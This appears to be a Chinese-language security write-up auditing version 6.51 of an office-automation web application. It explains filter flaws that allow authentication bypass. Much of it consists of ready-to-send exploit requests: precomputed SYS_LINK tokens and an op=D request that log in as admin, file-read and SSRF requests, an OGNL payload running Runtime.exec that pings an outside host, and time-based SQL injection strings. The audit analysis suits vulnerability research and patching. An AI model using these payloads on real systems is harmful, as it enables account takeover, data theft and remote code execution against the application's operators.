## 框架结构

`fe.war-6.51`目录结构精简如下

```
fe.war-6.51
  ｜- admin
  ｜- feconsole
  ｜- iweboffice
  ｜- META-INF
  ｜- WEB-INF
  ｜- about.jsp 查看版本
  ｜- index.jsp
  ｜- patchInfo.jsp 补丁历史信息
```

web.xml部分核心如下

```xml
    <context-param>
        <param-name>contextConfigLocation</param-name>
        <param-value>/WEB-INF/classes/spring/*-bean.xml</param-value>
    </context-param>

    <filter>
        <filter-name>controllerFilter</filter-name>
        <filter-class>fe.mvc.ControllerFilter5</filter-class>
    </filter> 
    
    <!--拦截
    *.jsp、*.jspx、*.do、*.ln、*.fe、*.xml、*.xf、
    /ProxyServletUtil、/servlet/pageProcessServlet、/remoteServlet -->

    <servlet>
        <servlet-name>workflow</servlet-name>
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <init-param>
            <param-name>contextConfigLocation</param-name>
            <param-value>
                /WEB-INF/classes/spring/workflow-bean.xml
            </param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet> <!-- 拦截 *.xf、*.fe-->
```

大部分后缀的路径都被`ControllerFilter5`拦截。跟进代码

```java
public void doFilter(ServletRequest srequest, ServletResponse sresponse, FilterChain chain) throws IOException, ServletException {
    String uri = request.getRequestURI();
    if (!uri.contains("/dwr/") || !uri.endsWith(".js") || this.verificationURL(request, uri, response)) {
        if (!uri.contains("/ProxyServletUtil") && !uri.contains("/servlet/pageProcessServlet") || this.verificationURL(request, uri, response)) {
            if ((!uri.endsWith(".jsp") || !this.isNotValidatePage(uri)) && !uri.endsWith(".xml") && !uri.endsWith(".xf") || this.verificationURL(request, uri, response)) {
                 if (!uri.endsWith(".jsp") && !uri.endsWith(".xf")) {
                     if (uri.endsWith(".do")) { /*重定向*/ }
                     else if (!uri.toUpperCase().endsWith(".JPG") && !uri.toUpperCase().endsWith(".JPEG") && !uri.toUpperCase().endsWith(".GIF") && !uri.toUpperCase().endsWith(".PNG")) {
                         if (uri.endsWith(".ln")) {
                                String sys_link = request.getParameter("SYS_LINK");
                                if (sys_link == null) {
                                    chain.doFilter(srequest, sresponse);
                                }else{...}
                         }
                     }else {
                         chain.doFilter(srequest, sresponse);
                     }
                 }
                 chain.doFilter(srequest, sresponse);
            }
        }
    }
}
```

### 权限绕过

#### js后缀绕过

`web.xml`中只定义了两个过滤器，一个用于UTF-8编码。另一个就是`ControllerFilter5`，对url的各种情况做判断，如果没有相应的权限就会重定向。总的来说，如果uri不是以`.jsp`结尾，就能符合大部分if条件执行到`chain.doFilter`通过过滤器。另外，该过滤器还不允许直接访问`/ProxyServletUtil、/servlet/pageProcessServlet`。

但是这里有个需要注意的点，就是过滤器很多if判断采用的是**或**关系。在URL中分号通常用于表示参数的分隔符。所以如果访问`/a.jsp;.js`，其实访问的是`/a.jsp`。`.js`会被当成访问参数。这种方式经常被用来绕过权限控制。在这里能用这种方式绕过的原因是过滤器第一个if中的条件都是**或**关系。

```java
 if (!uri.contains("/dwr/") || !uri.endsWith(".js") || this.verificationURL(request, uri, response))
```

虽然`/a.jsp;.js` 是`.js`结尾的，但是由于路径中没有`/dwr/`，就通过了第一个if校验。然后又因为不是`.jsp`结尾，最终执行到了`chain.doFilter`

#### url编码绕过

还有一种绕过方式是对路径中的某个字符进行url编码。由于过滤器只定义了UTF-8编码的和`ControllerFilter5`，所以在执行到这里时并没有进行过url编码处理，导致`ProxyServletUtil`和`ProxyServletUti%6c`不同，`.jsp`和`.js%70`不同。以此绕过if判断。Tomcat在处理请求的`requestDispatcherPath`时是会进行url解码的。所以最终能访问到实际的Servlet。

#### ln后缀绕过

uri如果以`.ln`结尾，会接收`SYS_LINK`，该值为空的话直接过了校验。但是这个绕过漏洞的精髓在于让这个值不为空，在重定向时跳转到构造linkMeta的url路径下。如果这个路径是后台页面就跳过了权限的校验。

```java
if (uri.endsWith(".ln")) {
    String sys_link = request.getParameter("SYS_LINK");
    if (sys_link == null) {
        chain.doFilter(srequest, sresponse);
    } else {
        try {
            long stime = System.currentTimeMillis();
            LinkMeta linkMeta = LinkUtil.getLinkMeta(sys_link);
            Date d = linkMeta.getExpired();
            if (d == null || !d.before(new Date())) {
                ResourceLoad.createResource(request, response);
                User user = linkMeta.getUser();
                Object o = ResourceManage.getContext("userLoginService");
                if (o instanceof UserLoginService) {
                    UserLoginService userLoginService = (UserLoginService)o;
                    userLoginService.loginByCas(user.getUserName(), request);
                }
						    ...
                response.sendRedirect(linkMeta.getUrl());
                return;
            }

            sresponse.getWriter().print("link error,url expired!");
            return;
        } 
} 
```

else中的基本逻辑是从`SYS_LINK`解析成`LinkMeta`，从其中能获取到Date、User。然后有个`loginByCas`，跟进发现其实调用的函数是`UserLoginService.loginByUserName()`，也就是根据用户名登陆。但是无论是登陆成功与否，都还是会执行重定向操作。那么只需要保证在执行`sendRedirect()`方法之前不能报错，否则就会走到异常处理。

跟一下`LinkMeta`的解析。值解密后分成三部分：`url、date、user`，并且用`||`分隔。

```java
    public static LinkMeta getLinkMeta(String str) throws Exception {
        byte[] bs = BaseFunc.hexStringToBytes(str);
        String value = new String(bs);
        String link = EncrypUtil.decrypt(value);
        String[] links = link.split("\\|\\|");
        LinkMeta linkMeta = new LinkMeta();
        linkMeta.setUrl(links[0]);
        linkMeta.setExpired((Date)ClassUtil.format(Date.class, links[1]));
        User user = new User();
        user.setUserName(links[2]);
        linkMeta.setUser(user);
        return linkMeta;
    }
```

url构造成后台的首页`/main/main.jsp`。user构造成`admin。`日期则是需要注意的，需要满足如下的条件才能执行到重定向。也就是日期的设置要么为空，要么得比当前的日期晚。假如今天是2024.1.1。那么日期就要设置为2024.1.2等。

```java
if (d == null || !d.before(new Date())) 
```

那么构造的数据如下

```
/main/main.jsp||2024-12-31||admin
```

网上流传的payload解析后的日期为`2024-01-01`。日后就会存在复现不成功的问题。需要自己构造新的日期。或者直接构造日期为空

```
http://your-ip/2.ln?SYS_LINK=77507068764957484a5067777862714f457a66574871642f4330574c76717868394a35496d37416c497951724f33446f51486375685a5a2b31684938472b7056
```

生成`SYS_LINK`，值如下。

```java
String payload="/main/main.jsp||2024-12-31||admin";
String returnValue = EncrypUtil.encrypt(payload);
byte[] bs = returnValue.getBytes();
returnValue = BaseFunc.bytesToHexString(bs);
System.out.println(returnValue);

// 2024-12-31截止的payload
684b4f4e43504169794d32537069395a527a77745348726975734b5565695a67466f664772784f325a65472b4f2f545374736c656a4f5930525a574564705975
  
// 日期为空的paylaod
4139644d5765446d56775577564165624f5563524459536e346d6766654d4c6279726f666548797a7645633d
```

#### loginService.fe登陆绕过

`web.xml`中定义了workflow的一个Servlet。实际配置文件位于`workflow-bean.xml`

```xml
    <servlet>
        <servlet-name>workflow</servlet-name>
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <init-param>
            <param-name>contextConfigLocation</param-name>
            <param-value>
                /WEB-INF/classes/spring/workflow-bean.xml
            </param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>
        <servlet-mapping>
        <servlet-name>workflow</servlet-name>
        <url-pattern>*.fe</url-pattern>
    </servlet-mapping>
```

跟进`workflow-bean.xml`

```xml
<beans>
  <bean id="trackService" class="fe.workflow.logic.TrackService">
      <property name="dao"><ref bean="dao"/></property>
  </bean>

	<!-- ERP协同查审 -->
	<bean name="/loginService.fe" class="fe.ext.erp.FeErpLoginServlet"></bean>

	<!-- 集成单点登录 -->
	<bean name="/portLoginService.fe" class="fe.ext.integrate.service.PortLoginServlet"></bean>
</beans>
```

路由`/loginService.fe`对应`FeErpLoginServlet`，类中是个典型的Spring MVC处理请求的方法。该方法和ln绕过的代码极为相似。都执行了`loginByCas()`用户名登陆。op的参数为`D`时，默认采用用户名`admin`进行登陆

```java
public class FeErpLoginServlet implements Controller {
    public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception {
        String userName = HtmlFormat.format(request.getParameter("userName"));
        String password = HtmlFormat.format(request.getParameter("pws"));
        String type = HtmlFormat.format(request.getParameter("type"));
        String url = "/oaerp/fileMonitor.jsp";
        if (type.equals("FEM")) {...}
        else{
            String op = HtmlFormat.format(request.getParameter("op"));
            if ("D".equals(op)) {
                userName = "admin";
            }
            try {
                new HashMap();
                ResourceLoad.createResource(request, response);
                Map<String, String> map = userLoginService.loginByCas(userName, request);
                ResourceLoad.createResource(request, response);
                message = (String)map.get("message");
                if ("true".equals(map.get("isLogin"))) {
                    isValid = "true";
                }
            }
            request.getRequestDispatcher(url).forward(request, response);
        }
    }
}
```





## 历史漏洞

| 漏洞名称                              | 访问路径                                                     |
| ------------------------------------- | ------------------------------------------------------------ |
| ProxyServletUtil 任意文件读取漏洞     | /ProxyServletUtil?url=file:///C:/windows/win.ini             |
| ShowImageServlet 任意文件读取漏洞     | /servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print |
| downLoadFiles.jsp 任意文件读取漏洞    | /system/mediafile/downLoadFiles.js%70                        |
| OfficeServer.jsp 任意文件上传漏洞     | /iweboffice/OfficeServer.jsp;.js                             |
| ln登陆绕过漏洞                        | /2.ln?SYS_LINK                                               |
| loginService.fe 登陆绕过漏洞          | /loginService.fe                                             |
| common_sort_tree.jsp 远程代码执行漏洞 | /common/common_sort_tree.jsp                                 |
| publicData.jsp sql注入漏洞            | /oaerp/ui/common/publicData.js%70 sql注入漏洞                |
| /feReport/chartList.jsp SQL注入漏洞   | /feReport/chartList.js%70                                    |
| /sys/treeXml.jsp SQL注入漏洞          | /sys/treeXml.js%70                                           |
| /parseTree.jsp SQL注入漏洞            | /common/parseTree.js%70                                      |



### ProxyServletUtil 任意文件读取漏洞

```
GET /ProxyServletUti%6c?url=file:///C:/windows/win.ini HTTP/1.1
```

主要是用url编码将`l`进行编码来绕过过滤器的权限校验。代码是典型的SSRF，挖起来很简单

```java
public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    String urlString = request.getParameter("url");
    this.writeResponse(response, urlString);
}

private void writeResponse(HttpServletResponse response, String urlString) throws ServletException {
    try {
        URL url = new URL(urlString);
        URLConnection urlConnection = url.openConnection();
        response.setContentType(urlConnection.getContentType());
        InputStream ins = urlConnection.getInputStream();
        OutputStream outs = response.getOutputStream();
        byte[] buffer = new byte[this.READ_BUFFER_SIZE];
        int bytesRead;
        while((bytesRead = ins.read(buffer, 0, this.READ_BUFFER_SIZE)) != -1) {
                outs.write(buffer, 0, bytesRead);
        }

        outs.flush();
        outs.close();
        ins.close();
}
```



### downLoadFiles.jsp 任意文件下载漏洞

```
POST /system/mediafile/downLoadFiles.js%70 HTTP/1.1 
Host: ip
User-Agent: python-requests/2.31.0 Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded 
Content-Length: 92

path=..%2F..%2Fjboss%2Fweb%2Ffe.war%2Fsystem/mediafile/downLoadFiles.jsp&msVal=2222222222%2C
```



### /loginService.fe 登陆绕过

```
GET /loginService.fe?op=D HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36

```

取出响应中头部的`Set-Cookie: JESSIONID=xxxx`

```
GET /main/main.jsp
Cookie: JESSIONID=xxxx
```

漏洞分析在上文框架结构中。



### common_sort_tree.jsp 远程代码执行漏洞

```
POST /common/common_sort_tree.jsp;.js HTTP/1.1 
Host: ip
Accept-Encoding: gzip-deflate
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 102

rootName={%25Thread.@java.lang.Runtime@getRuntime().exec('ping+-nc+2+xxx.org')%25}
```

这是历史漏洞中比较有意思的一个洞。跟进`common_sort_tree.jsp`

```java
<%@ taglib prefix="fe" tagdir="/WEB-INF/tags" %>
<%
    Builder builder = (Builder) ResourceManage.getContext("build");
    String code = HtmlFormat.format(request.getParameter("code"));
    String rootName = HtmlFormat.format(request.getParameter("rootName"));//分类项描述
    String moreFlag = HtmlFormat.format(request.getParameter("moreFlag"));//是否多分类项
    String defaultType = HtmlFormat.format(request.getParameter("defaultType"));//如果是多分类项，默认那个分类项
    ...
    if (rootName.length() > 5)
        rootName = (String) builder.buildExp(rootName);
    String GGID = request.getParameter("GGID");
    String _sysParameter = request.getParameter("SYS_PARAMETER_");
%>
```

`buildExp`这种从名称上包含Exp的都可能是具有表达式执行的方法，跟进`buildExp()`，参数名直接是`expression`。验证了可能存在表达式处理。一般表达式处理都是先编译，再执行。`compiler`编译过程就包括根据表达式的起始和结束标记`{}`来处理表达式。如果编译后的表达式不为空，通过`clone`方法选取解析器`SimpleAnalyseImpl`，执行`analy()`方法

```java
    public Object buildExp(String expression) {
        if (expression != null && !"".equals(expression)) {
            List<String> list = this.compiler.compiler(expression);
            if (list.size() == 0) {
                return expression;
            } else {
                Analyse tanalyse = this.analyse.clone();
                tanalyse.setSyntax(list);
                Object o = tanalyse.analy(-1);
                list = null;
                tanalyse = null;
                return o;
            }
        } else {
            return null;
        }
    }
```

`analy()`方法从表达式列表中获取表达式，设定起始和结束位`{}`。

```java
    public Object analy(String start, String stop, String content) {
        Parse p = (Parse)this.mapValue.get(stop);
        if (p == null) {
            if (this.defaultParse == null) {
                throw new WuelException("not parse for " + start + " and " + stop);
            } else {
                return this.defaultParse.load(this, start + content + stop);
            }
        } else {
            return p.load(this, content);
        }
    }
```

执行到`load()`方法时，会发现有多个实现类。

```
BasicParse
ExecSqlParseImpl
LoadObjectParseImpl
LoadValueParseImpl
MethodValueParseImpl
ObjectParseImpl
ObjectValueParseImpl
WebValueParseImpl
```

这些实现类都位于`fe.wuel.impl`。查找`wuel`相关的配置文件，定位到`wuel-bean.xml`。可以看到不同的表达式标识对应了不同的解析器。如`{}`对应`objectValueParseImpl`。`$$`对应`methodValueParseImpl`

```xml
 <!-- 表达式解释器入口 --> 
   <bean id="build" class="fe.wuel.Builder" init-method="init" singleton="false">
      <property name="analyse"><ref bean="analyse"/></property>
      <property name="compiler"><ref bean="compiler"/></property>
      <property name="parseMap">
        <map>
           <entry key="{##}"><ref bean="webValueParse"/></entry>
           <entry key="{%%}"><ref bean="objectValueParseImpl"/></entry>
           <entry key="[##]"><ref bean="loadValueParse"/></entry>
           <entry key=">>%>"><ref bean="objectParse"/></entry>
           <entry key=">##>"><ref bean="execSqlParse"/></entry>
           <entry key="$$"><ref bean="methodValueParseImpl"/></entry>
           <entry key="[%%]"><ref bean="loadObjectParseImpl"/></entry>
        </map>
      </property>
      <property name="preFlag">
              <value>>></value>
         </property>
	     <property name="nextFlag">
	         <value>%></value>
	   </property>
   </bean>
```

跟进`objectValueParseImpl`，存在OGNL表达式解析

```java
public Object load(Analyse build, String language) {
        int[] otherParse = this.parse(language);

        int j;
        Object o;
        String ObjectName;
        for(j = 0; j < otherParse.length; ++j) {
            o = build.analy(otherParse[j]);
            ObjectName = o == null ? "" : o.toString();
            language = this.replace(language, ObjectName, otherParse[j]);
        }

        if (language.startsWith("'") && language.endsWith("'")) {
            return language.substring(1, language.length() - 1);
        } else {
            j = language.indexOf(".");
            o = null;
            if (j > 0) {
                ObjectName = language.substring(0, j);
                String fieldName = language.substring(j + 1, language.length());
                o = ResourceManage.getResource(ObjectName);
                o = ObjectUtil.getValue(o, fieldName); // Ognl.getValue(expe, o);
            } else {
                o = ResourceManage.getResource(language);
            }

            return o;
        }
    }
```





### publicData.jsp sql注入漏洞

```
GET /oaerp/ui/common/publicData.js%70?type=getAllTableInfo&db=';waitfor+delay+'0:0:3'-- HTTP/1.1
Host: ip
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,imag e/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 0
```

代码

```java
<% 
	String type = request.getParameter("type");
	if("getSelectData".equals(type)){...}
	else if("getAllTableInfo".equals(type)){
  CommonSelectService css = (CommonSelectService)ResourceManage.getContext("commonselectservice");
		String db = request.getParameter("db"); 
		out.print(css.getAllTableInfos(db)); // dt = this.dao.getDataTable("SYS_TABLE", "ST02='" + db + "'", "", 1, Integer.MAX_VALUE);
	}
```



### /feReport/chartList.jsp SQL注入漏洞

```
GET /feReport/chartList.js%70?delId=1&reportId=(SELECT+(CASE+WHEN+ (1=1)+THEN+1+ELSE+(SELECT+8384+UNION+SELECT+1867)+END)) HTTP/1.1 
Host: ip
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,imag e/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 0


```



### /sys/treeXml.jsp SQL注入漏洞

```
GET /sys/treeXml.js%70?menuName=1';waitfor+delay+'0:0:3'--&type=function HTTP/1.1
Host: ip
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,imag e/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 0


```



### /parseTree.jsp SQL注入漏洞

```
GET /common/parseTree.js%70?code=1';waitfor+delay+'0:0:5'-- HTTP/1.1
Host: ip
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,imag e/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 0


```

